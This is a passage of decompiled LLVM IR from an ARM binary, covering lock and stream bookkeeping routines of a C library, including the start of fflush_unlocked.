dec_label_pc_1ffac:                               ; preds = %dec_label_pc_1ff80, %dec_label_pc_1ffe4
  %v0_1ffd02 = phi i32 [ %v0_1ffe4, %dec_label_pc_1ffe4 ], [ %v0_1ffe8.pr, %dec_label_pc_1ff80 ]
  %v1_1ffac = inttoptr i32 %v0_1ffd02 to i16*
  %v2_1ffac = load i16, i16* %v1_1ffac, align 2
  %v3_1ffac = zext i16 %v2_1ffac to i32
  store i32 %v3_1ffac, i32* %r3.global-to-local, align 4
  %v2_1ffb0 = and i32 %v3_1ffac, 32816
  store i32 %v2_1ffb0, i32* %r1.global-to-local, align 4
  %v2_1ffb4 = icmp ugt i32 %v2_1ffb0, 47
  store i1 %v2_1ffb4, i1* %cpsr_c.global-to-local, align 1
  %v7_1ffb4 = icmp eq i32 %v2_1ffb0, 48
  %v1_1ffb8 = add i32 %v0_1ffd02, 32
  %v2_1ffb8 = inttoptr i32 %v1_1ffb8 to i32*
  %v3_1ffb8 = load i32, i32* %v2_1ffb8, align 4
  store i32 %v3_1ffb8, i32* %r4.global-to-local, align 4
  br i1 %v7_1ffb4, label %dec_label_pc_1ffc4, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_1ffac
  store i32 %v0_1ffd02, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1ffe4

dec_label_pc_1ffc4:                               ; preds = %dec_label_pc_1ffac
  %v0_1ffc4 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1ffc4 = icmp eq i32 %v0_1ffc4, 0
  br i1 %v2_1ffc4, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_1ffc4
  %v1_1ffc8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ffc8 = load i32, i32* %r7.global-to-local, align 4
  %v3_1ffc8 = add i32 %v2_1ffc8, %v1_1ffc8
  %v4_1ffc8 = inttoptr i32 %v3_1ffc8 to i32*
  %v5_1ffc8 = load i32, i32* %v4_1ffc8, align 4
  store i32 %v5_1ffc8, i32* %r3.global-to-local, align 4
  %v3_1ffcc = inttoptr i32 %v5_1ffc8 to i32*
  store i32 %v3_1ffb8, i32* %v3_1ffcc, align 4
  %v0_1ffd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ffd0 = inttoptr i32 %v0_1ffd0 to i16*
  %v2_1ffd0 = load i16, i16* %v1_1ffd0, align 2
  %v3_1ffd0 = zext i16 %v2_1ffd0 to i32
  store i32 %v3_1ffd0, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_1ffc4
  %v2_1ffd08 = load i16, i16* %v1_1ffac, align 2
  %v3_1ffd09 = zext i16 %v2_1ffd08 to i32
  store i32 %v3_1ffd09, i32* %r3.global-to-local, align 4
  %v3_1ffd4 = add i32 %v0_1ffc4, 32
  %v4_1ffd4 = inttoptr i32 %v3_1ffd4 to i32*
  store i32 %v3_1ffb8, i32* %v4_1ffd4, align 4
  %v0_1ffd8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_1ffd8 = phi i32 [ %v3_1ffd0, %.thread ], [ %v0_1ffd8.pre, %bb49 ]
  %v1_1ffd8 = and i32 %v0_1ffd8, 8192
  %v2_1ffd8 = icmp eq i32 %v1_1ffd8, 0
  br i1 %v2_1ffd8, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_1ffdc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1ffdc, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_1ffe0 = xor i1 %v2_1ffd8, true
  call void @__pseudo_cond_branch(i1 %v1_1ffe0, i32 ptrtoint (i32* @global_var_1c6e8.667 to i32))
  %v0_1ffe4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1ffe4

dec_label_pc_1ffe4:                               ; preds = %.thread38, %bb52
  %v0_1ffe4 = phi i32 [ %v0_1ffe4.pre, %bb52 ], [ %v3_1ffb8, %.thread38 ]
  store i32 %v0_1ffe4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1ffe8 = icmp eq i32 %v0_1ffe4, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_1ffe8, label %dec_label_pc_1fff4, label %dec_label_pc_1ffac

dec_label_pc_1fff4:                               ; preds = %dec_label_pc_1ffe4, %dec_label_pc_1ff80
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_1fff8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1fff8 = add i32 %v0_1fff8, 152
  %v3_1fff8 = inttoptr i32 %v2_1fff8 to i32*
  %v4_1fff8 = load i32, i32* %v3_1fff8, align 4
  store i32 %v4_1fff8, i32* %r0.global-to-local, align 4
  %v1_1fffc = add i32 %v4_1fff8, 4
  %v2_1fffc = inttoptr i32 %v1_1fffc to i32*
  %v3_1fffc = load i32, i32* %v2_1fffc, align 4
  %v1_20000 = add i32 %v3_1fffc, -1
  store i32 %v1_20000, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_20004 = icmp eq i32 %v1_20000, 0
  store i32 %v1_20000, i32* %v2_1fffc, align 4
  br i1 %v2_20004, label %dec_label_pc_20010, label %dec_label_pc_20070

dec_label_pc_20010:                               ; preds = %dec_label_pc_1fff4
  %v0_20010 = load i32, i32* %r3.global-to-local, align 4
  %v1_20010 = load i32, i32* %r0.global-to-local, align 4
  %v2_20010 = add i32 %v1_20010, 8
  %v3_20010 = inttoptr i32 %v2_20010 to i32*
  store i32 %v0_20010, i32* %v3_20010, align 4
  %v0_20014 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_20014, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_20018

dec_label_pc_20018:                               ; preds = %dec_label_pc_20048.dec_label_pc_20018_crit_edge, %dec_label_pc_20010
  %v0_20018 = phi i32 [ %v0_20018.pre, %dec_label_pc_20048.dec_label_pc_20018_crit_edge ], [ %v0_20014, %dec_label_pc_20010 ]
  %v1_20018 = inttoptr i32 %v0_20018 to i32*
  %v2_20018 = load i32, i32* %v1_20018, align 4
  store i32 %v2_20018, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_20018, i32* %r2.global-to-local, align 4
  %v2_2002474 = load i32, i32* %v1_20018, align 4
  store i32 %v2_2002474, i32* %r3.global-to-local, align 4
  %v3_2002876 = icmp uge i32 %v2_2002474, %v2_20018
  store i1 %v3_2002876, i1* %cpsr_c.global-to-local, align 1
  %v9_2002882 = icmp eq i32 %v2_2002474, %v2_20018
  br i1 %v9_2002882, label %dec_label_pc_20030, label %dec_label_pc_20048

dec_label_pc_20030:                               ; preds = %dec_label_pc_20018, %dec_label_pc_20030.dec_label_pc_20024_crit_edge
  %v0_2003083 = phi i32 [ %v1_20028.pre, %dec_label_pc_20030.dec_label_pc_20024_crit_edge ], [ %v2_20018, %dec_label_pc_20018 ]
  store i32 %v0_2003083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_20040 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_20040, label %dec_label_pc_20044, label %dec_label_pc_20030.dec_label_pc_20024_crit_edge

dec_label_pc_20030.dec_label_pc_20024_crit_edge:  ; preds = %dec_label_pc_20030
  %v0_20024.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_20028.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_20024 = inttoptr i32 %v0_20024.pre to i32*
  %v2_20024 = load i32, i32* %v1_20024, align 4
  store i32 %v2_20024, i32* %r3.global-to-local, align 4
  %v3_20028 = icmp uge i32 %v2_20024, %v1_20028.pre
  store i1 %v3_20028, i1* %cpsr_c.global-to-local, align 1
  %v9_20028 = icmp eq i32 %v2_20024, %v1_20028.pre
  br i1 %v9_20028, label %dec_label_pc_20030, label %dec_label_pc_20048

dec_label_pc_20044:                               ; preds = %dec_label_pc_20030
  %v0_20044 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_20044, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_20048

dec_label_pc_20048:                               ; preds = %dec_label_pc_20018, %dec_label_pc_20030.dec_label_pc_20024_crit_edge, %dec_label_pc_20044
  %v0_20050 = phi i32 [ %v0_20044, %dec_label_pc_20044 ], [ %v2_2002474, %dec_label_pc_20018 ], [ %v2_20024, %dec_label_pc_20030.dec_label_pc_20024_crit_edge ]
  %v1_20048 = phi i32 [ %v0_20044, %dec_label_pc_20044 ], [ %v2_20018, %dec_label_pc_20018 ], [ %v1_20028.pre, %dec_label_pc_20030.dec_label_pc_20024_crit_edge ]
  %v3_20048 = icmp uge i32 %v0_20050, %v1_20048
  store i1 %v3_20048, i1* %cpsr_c.global-to-local, align 1
  %v9_20048 = icmp eq i32 %v0_20050, %v1_20048
  br i1 %v9_20048, label %dec_label_pc_20050, label %dec_label_pc_20048.dec_label_pc_20018_crit_edge

dec_label_pc_20048.dec_label_pc_20018_crit_edge:  ; preds = %dec_label_pc_20048
  %v0_20018.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_20018

dec_label_pc_20050:                               ; preds = %dec_label_pc_20048
  %v2_20050 = icmp ne i32 %v1_20048, 0
  store i1 %v2_20050, i1* %cpsr_c.global-to-local, align 1
  %v7_20054 = icmp slt i32 %v1_20048, 2
  br i1 %v7_20054, label %dec_label_pc_20070, label %dec_label_pc_20058

dec_label_pc_20058:                               ; preds = %dec_label_pc_20050
  %v0_20058 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_20058, i32* %r0.global-to-local, align 4
  %v0_2005c = load i32, i32* %r1.global-to-local, align 4
  %v1_2005c = add i32 %v0_2005c, 129
  store i32 %v1_2005c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_20070

dec_label_pc_20070:                               ; preds = %dec_label_pc_1fff4, %dec_label_pc_20058, %dec_label_pc_20050
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_20074 = load i32, i32* %r5.global-to-local, align 4
  %v2_20074 = add i32 %v0_20074, 80
  %v3_20074 = inttoptr i32 %v2_20074 to i32*
  %v4_20074 = load i32, i32* %v3_20074, align 4
  store i32 %v4_20074, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_2007c = inttoptr i32 %v4_20074 to i32*
  store i32 0, i32* %v2_2007c, align 4
  br label %dec_label_pc_20080

dec_label_pc_20080:                               ; preds = %dec_label_pc_1fef4, %dec_label_pc_1ff1c, %dec_label_pc_20070
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_20084 = load i32, i32* %r5.global-to-local, align 4
  %v2_20084 = add i32 %v0_20084, 160
  %v3_20084 = inttoptr i32 %v2_20084 to i32*
  %v4_20084 = load i32, i32* %v3_20084, align 4
  store i32 %v4_20084, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_2008c = add i32 %v0_20084, 12
  %v3_2008c = inttoptr i32 %v2_2008c to i32*
  %v4_2008c = load i32, i32* %v3_2008c, align 4
  store i32 %v4_2008c, i32* %r1.global-to-local, align 4
  %v1_20090 = add i32 %v4_20084, 4
  %v2_20090 = inttoptr i32 %v1_20090 to i32*
  %v3_20090 = load i32, i32* %v2_20090, align 4
  store i32 %v3_20090, i32* %r2.global-to-local, align 4
  %v1_20094 = inttoptr i32 %v4_2008c to i32*
  %v2_20094 = load i32, i32* %v1_20094, align 4
  %v1_20098 = add i32 %v3_20090, -1
  store i32 %v1_20098, i32* %r2.global-to-local, align 4
  %v1_2009c = add i32 %v2_20094, -1
  store i32 %v1_2009c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_200a0 = icmp eq i32 %v1_20098, 0
  store i32 %v1_2009c, i32* %v1_20094, align 4
  %v0_200a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_200a8 = load i32, i32* %r0.global-to-local, align 4
  %v2_200a8 = add i32 %v1_200a8, 4
  %v3_200a8 = inttoptr i32 %v2_200a8 to i32*
  store i32 %v0_200a8, i32* %v3_200a8, align 4
  br i1 %v2_200a0, label %dec_label_pc_200b0, label %dec_label_pc_20110

dec_label_pc_200b0:                               ; preds = %dec_label_pc_20080
  %v0_200b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_200b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_200b0 = add i32 %v1_200b0, 8
  %v3_200b0 = inttoptr i32 %v2_200b0 to i32*
  store i32 %v0_200b0, i32* %v3_200b0, align 4
  %v0_200b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_200b4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_200b8

dec_label_pc_200b8:                               ; preds = %dec_label_pc_200e8.dec_label_pc_200b8_crit_edge, %dec_label_pc_200b0
  %v0_200b8 = phi i32 [ %v0_200b8.pre, %dec_label_pc_200e8.dec_label_pc_200b8_crit_edge ], [ %v0_200b4, %dec_label_pc_200b0 ]
  %v1_200b8 = inttoptr i32 %v0_200b8 to i32*
  %v2_200b8 = load i32, i32* %v1_200b8, align 4
  store i32 %v2_200b8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_200b8, i32* %r2.global-to-local, align 4
  %v2_200c462 = load i32, i32* %v1_200b8, align 4
  store i32 %v2_200c462, i32* %r3.global-to-local, align 4
  %v3_200c864 = icmp uge i32 %v2_200c462, %v2_200b8
  store i1 %v3_200c864, i1* %cpsr_c.global-to-local, align 1
  %v9_200c870 = icmp eq i32 %v2_200c462, %v2_200b8
  br i1 %v9_200c870, label %dec_label_pc_200d0, label %dec_label_pc_200e8

dec_label_pc_200d0:                               ; preds = %dec_label_pc_200b8, %dec_label_pc_200d0.dec_label_pc_200c4_crit_edge
  %v0_200d071 = phi i32 [ %v1_200c8.pre, %dec_label_pc_200d0.dec_label_pc_200c4_crit_edge ], [ %v2_200b8, %dec_label_pc_200b8 ]
  store i32 %v0_200d071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_200e0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_200e0, label %dec_label_pc_200e4, label %dec_label_pc_200d0.dec_label_pc_200c4_crit_edge

dec_label_pc_200d0.dec_label_pc_200c4_crit_edge:  ; preds = %dec_label_pc_200d0
  %v0_200c4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_200c8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_200c4 = inttoptr i32 %v0_200c4.pre to i32*
  %v2_200c4 = load i32, i32* %v1_200c4, align 4
  store i32 %v2_200c4, i32* %r3.global-to-local, align 4
  %v3_200c8 = icmp uge i32 %v2_200c4, %v1_200c8.pre
  store i1 %v3_200c8, i1* %cpsr_c.global-to-local, align 1
  %v9_200c8 = icmp eq i32 %v2_200c4, %v1_200c8.pre
  br i1 %v9_200c8, label %dec_label_pc_200d0, label %dec_label_pc_200e8

dec_label_pc_200e4:                               ; preds = %dec_label_pc_200d0
  %v0_200e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_200e4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_200e8

dec_label_pc_200e8:                               ; preds = %dec_label_pc_200b8, %dec_label_pc_200d0.dec_label_pc_200c4_crit_edge, %dec_label_pc_200e4
  %v0_200f0 = phi i32 [ %v0_200e4, %dec_label_pc_200e4 ], [ %v2_200c462, %dec_label_pc_200b8 ], [ %v2_200c4, %dec_label_pc_200d0.dec_label_pc_200c4_crit_edge ]
  %v1_200e8 = phi i32 [ %v0_200e4, %dec_label_pc_200e4 ], [ %v2_200b8, %dec_label_pc_200b8 ], [ %v1_200c8.pre, %dec_label_pc_200d0.dec_label_pc_200c4_crit_edge ]
  %v3_200e8 = icmp uge i32 %v0_200f0, %v1_200e8
  store i1 %v3_200e8, i1* %cpsr_c.global-to-local, align 1
  %v9_200e8 = icmp eq i32 %v0_200f0, %v1_200e8
  br i1 %v9_200e8, label %dec_label_pc_200f0, label %dec_label_pc_200e8.dec_label_pc_200b8_crit_edge

dec_label_pc_200e8.dec_label_pc_200b8_crit_edge:  ; preds = %dec_label_pc_200e8
  %v0_200b8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_200b8

dec_label_pc_200f0:                               ; preds = %dec_label_pc_200e8
  %v2_200f0 = icmp ne i32 %v1_200e8, 0
  store i1 %v2_200f0, i1* %cpsr_c.global-to-local, align 1
  %v7_200f4 = icmp slt i32 %v1_200e8, 2
  br i1 %v7_200f4, label %dec_label_pc_20110, label %dec_label_pc_200f8

dec_label_pc_200f8:                               ; preds = %dec_label_pc_200f0
  %v0_200f8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_200f8, i32* %r0.global-to-local, align 4
  %v0_200fc = load i32, i32* %r1.global-to-local, align 4
  %v1_200fc = add i32 %v0_200fc, 129
  store i32 %v1_200fc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_20110

dec_label_pc_20110:                               ; preds = %dec_label_pc_20080, %dec_label_pc_200f8, %dec_label_pc_200f0
  %v2_20114 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_20114, i32* %r4.global-to-local, align 4
  %v1_20118 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_20118

; uselistorder directives
  uselistorder i32 %v0_200e4, { 1, 0, 2 }
  uselistorder i32 %v1_200c8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_200b8, { 1, 0 }
  uselistorder i32 %v0_20044, { 1, 0, 2 }
  uselistorder i32 %v1_20028.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_20018, { 1, 0 }
  uselistorder i32 %v0_1ffe4, { 2, 1, 0 }
  uselistorder i32 %v0_1ff88, { 1, 0 }
  uselistorder i32 %v0_1ff6c, { 1, 0, 2 }
  uselistorder i32 %v1_1ff50.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1ff3c, { 1, 0 }
  uselistorder i32 %v0_1fee0, { 1, 0, 2 }
  uselistorder i32 %v1_1fec4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_1fe98, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 11, 12, 13, 14, 15, 1, 0, 2, 3, 4, 6, 5, 7, 9, 8, 10 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 4, 5, 0, 1, 6, 2, 3, 7 }
  uselistorder i32* %r4.global-to-local, { 11, 13, 12, 14, 0, 1, 2, 3, 4, 6, 5, 7, 9, 8, 10 }
  uselistorder i32* %r3.global-to-local, { 32, 33, 35, 34, 28, 36, 37, 38, 39, 40, 41, 42, 1, 0, 29, 2, 3, 4, 43, 44, 5, 6, 7, 8, 9, 10, 11, 13, 12, 30, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 31, 26, 27 }
  uselistorder i32* %r2.global-to-local, { 13, 14, 15, 17, 16, 18, 19, 20, 21, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r1.global-to-local, { 8, 9, 10, 11, 12, 1, 2, 4, 3, 0, 5, 6, 7 }
  uselistorder i32* %r0.global-to-local, { 13, 11, 12, 14, 16, 15, 17, 18, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i1* %cpsr_c.global-to-local, { 21, 22, 24, 23, 14, 25, 26, 27, 1, 15, 16, 2, 5, 3, 4, 0, 6, 7, 17, 18, 8, 9, 10, 11, 12, 19, 20, 13 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 8, 3, 10, 0, 9, 4, 1, 2, 5, 6, 7 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_20110, { 1, 2, 0 }
  uselistorder label %dec_label_pc_200e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_200d0, { 1, 0 }
  uselistorder label %dec_label_pc_20080, { 2, 1, 0 }
  uselistorder label %dec_label_pc_20070, { 1, 2, 0 }
  uselistorder label %dec_label_pc_20048, { 2, 1, 0 }
  uselistorder label %dec_label_pc_20030, { 1, 0 }
  uselistorder label %dec_label_pc_1ffe4, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1ffac, { 1, 0 }
  uselistorder label %dec_label_pc_1ff80, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_1ff70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ff58, { 1, 0 }
  uselistorder label %dec_label_pc_1fef4, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_1fee4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1fecc, { 1, 0 }
}

define i32 @function_20120(i32 %arg1) local_unnamed_addr {
dec_label_pc_20120:
  %v0_20120 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_20120, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_20120
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_20120, %bb
  %v10_20134 = phi i32 [ %arg1, %dec_label_pc_20120 ], [ 0, %bb ]
  ret i32 %v10_20134

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_20138 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r6, align 4
  %v4_20148 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 76) to i32*), align 4
  store i32 %v4_20148, i32* %r3.global-to-local, align 4
  %v4_2014c = icmp uge i32 %tmp, %v4_20148
  store i1 %v4_2014c, i1* %cpsr_c.global-to-local, align 1
  %v10_2014c = icmp eq i32 %tmp, %v4_20148
  br i1 %v10_2014c, label %bb, label %dec_label_pc_20164

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_20174

dec_label_pc_20164:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_20168 = icmp eq i16* %arg1, null
  br i1 %v3_20168, label %dec_label_pc_20174, label %dec_label_pc_20488

dec_label_pc_20174:                               ; preds = %bb, %dec_label_pc_20164
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_20164 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_20178 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 160) to i32*), align 4
  store i32 %v4_20178, i32* %r5.global-to-local, align 4
  %v0_2017c = call i32 @__aeabi_read_tp()
  store i32 %v0_2017c, i32* %r0.global-to-local, align 4
  %v1_20180 = add i32 %v4_20178, 8
  %v2_20180 = inttoptr i32 %v1_20180 to i32*
  %v3_20180 = load i32, i32* %v2_20180, align 4
  store i32 %v3_20180, i32* %r3.global-to-local, align 4
  %v1_20184 = add i32 %v0_2017c, -1168
  store i32 %v1_20184, i32* %r8.global-to-local, align 4
  %v3_20188 = icmp uge i32 %v3_20180, %v1_20184
  store i1 %v3_20188, i1* %cpsr_c.global-to-local, align 1
  %v9_20188 = icmp eq i32 %v3_20180, %v1_20184
  br i1 %v9_20188, label %dec_label_pc_201d0, label %dec_label_pc_20190

dec_label_pc_20190:                               ; preds = %dec_label_pc_20174
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_20178, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_2019c143 = inttoptr i32 %v4_20178 to i32*
  %v2_2019c144 = load i32, i32* %v1_2019c143, align 4
  store i32 %v2_2019c144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_201a0146 = icmp eq i32 %v2_2019c144, 0
  br i1 %v9_201a0146, label %dec_label_pc_201a8, label %dec_label_pc_201c0

dec_label_pc_201a8:                               ; preds = %dec_label_pc_20190, %dec_label_pc_201a8.dec_label_pc_2019c_crit_edge
  %v0_201a8147 = phi i32 [ %v1_201a0.pre, %dec_label_pc_201a8.dec_label_pc_2019c_crit_edge ], [ 0, %dec_label_pc_20190 ]
  store i32 %v0_201a8147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_201b8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_201b8, label %dec_label_pc_201bc, label %dec_label_pc_201a8.dec_label_pc_2019c_crit_edge

dec_label_pc_201a8.dec_label_pc_2019c_crit_edge:  ; preds = %dec_label_pc_201a8
  %v0_2019c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_201a0.pre = load i32, i32* @r4, align 4
  %v1_2019c = inttoptr i32 %v0_2019c.pre to i32*
  %v2_2019c = load i32, i32* %v1_2019c, align 4
  store i32 %v2_2019c, i32* %r3.global-to-local, align 4
  %v3_201a0 = icmp uge i32 %v2_2019c, %v1_201a0.pre
  store i1 %v3_201a0, i1* %cpsr_c.global-to-local, align 1
  %v9_201a0 = icmp eq i32 %v2_2019c, %v1_201a0.pre
  br i1 %v9_201a0, label %dec_label_pc_201a8, label %dec_label_pc_201c0

dec_label_pc_201bc:                               ; preds = %dec_label_pc_201a8
  %v0_201bc = load i32, i32* @r4, align 4
  store i32 %v0_201bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_201c0

dec_label_pc_201c0:                               ; preds = %dec_label_pc_20190, %dec_label_pc_201a8.dec_label_pc_2019c_crit_edge, %dec_label_pc_201bc
  %v0_201c0 = phi i32 [ %v0_201bc, %dec_label_pc_201bc ], [ %v2_2019c144, %dec_label_pc_20190 ], [ %v2_2019c, %dec_label_pc_201a8.dec_label_pc_2019c_crit_edge ]
  %v1_201c0 = phi i32 [ %v0_201bc, %dec_label_pc_201bc ], [ 0, %dec_label_pc_20190 ], [ %v1_201a0.pre, %dec_label_pc_201a8.dec_label_pc_2019c_crit_edge ]
  %v3_201c0 = icmp uge i32 %v0_201c0, %v1_201c0
  store i1 %v3_201c0, i1* %cpsr_c.global-to-local, align 1
  %v9_201c0 = icmp eq i32 %v0_201c0, %v1_201c0
  br i1 %v9_201c0, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_201c0
  %v1_201c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_201c4, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_201c0, %bb65
  %v1_201c8 = xor i1 %v9_201c0, true
  call void @__pseudo_cond_branch(i1 %v1_201c8, i32 ptrtoint (i32* @global_var_1d8a0.575 to i32))
  %v0_201cc = load i32, i32* %r8.global-to-local, align 4
  %v1_201cc = load i32, i32* %r5.global-to-local, align 4
  %v2_201cc = add i32 %v1_201cc, 8
  %v3_201cc = inttoptr i32 %v2_201cc to i32*
  store i32 %v0_201cc, i32* %v3_201cc, align 4
  br label %dec_label_pc_201d0

dec_label_pc_201d0:                               ; preds = %dec_label_pc_20174, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_201d4 = load i32, i32* @r6, align 4
  %v2_201d4 = add i32 %v0_201d4, 160
  %v3_201d4 = inttoptr i32 %v2_201d4 to i32*
  %v4_201d4 = load i32, i32* %v3_201d4, align 4
  store i32 %v4_201d4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_201dc = add i32 %v0_201d4, 12
  %v3_201dc = inttoptr i32 %v2_201dc to i32*
  %v4_201dc = load i32, i32* %v3_201dc, align 4
  store i32 %v4_201dc, i32* %r2.global-to-local, align 4
  %v1_201e0 = add i32 %v4_201d4, 4
  %v2_201e0 = inttoptr i32 %v1_201e0 to i32*
  %v3_201e0 = load i32, i32* %v2_201e0, align 4
  store i32 %v3_201e0, i32* %r1.global-to-local, align 4
  %v1_201e4 = inttoptr i32 %v4_201dc to i32*
  %v2_201e4 = load i32, i32* %v1_201e4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_201e8 = icmp eq i32 %v3_201e0, 0
  %v1_201ec = add i32 %v2_201e4, 1
  store i32 %v1_201ec, i32* %r3.global-to-local, align 4
  store i32 %v1_201ec, i32* %v1_201e4, align 4
  br i1 %v2_201e8, label %dec_label_pc_201f8, label %dec_label_pc_20258

dec_label_pc_201f8:                               ; preds = %dec_label_pc_201d0
